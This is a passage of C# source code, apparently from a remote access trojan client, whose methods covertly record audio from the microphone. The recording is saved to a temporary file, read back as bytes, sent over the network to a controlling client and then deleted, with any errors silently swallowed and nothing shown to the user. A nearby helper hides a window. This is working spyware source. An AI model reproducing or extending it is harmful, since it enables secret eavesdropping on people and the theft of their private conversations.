            if (C.Visibility == System.Windows.Visibility.Visible)
                C.Hide();
        }


        //Starts audio recorder
        private void StartAR()
        {
            try
            {
                if (!ARActive)
                {
                    Record("open new Type waveaudio Alias recsound", "", 0, 0);
                    Record("record recsound", "", 0, 0);
                    if (File.Exists(AudioPath))
                        File.Delete(AudioPath);
                    ARActive = true;
                }
            }
            catch { }
        }

        //Stops audio recorder
        private void StopAR()
        {
            try
            {
                if (ARActive)
                {
                    Record("save recsound " + AudioPath, "", 0, 0);
                    Record("close recsound", "", 0, 0);
                    Thread.Sleep(100);
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(AudioPath, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }

                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.MicrophoneRecordingType);
                    ToSend.AddRange(FileBytes);
                    Networking.MainClient.Send(ToSend.ToArray());
                    File.Delete(AudioPath);
                    ARActive = false;
                }
            }
            catch { }
        }

        //Pulls text out between two strings
        private string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch
            {
                return "";
            }
        }


        #endregion Functions

    }
}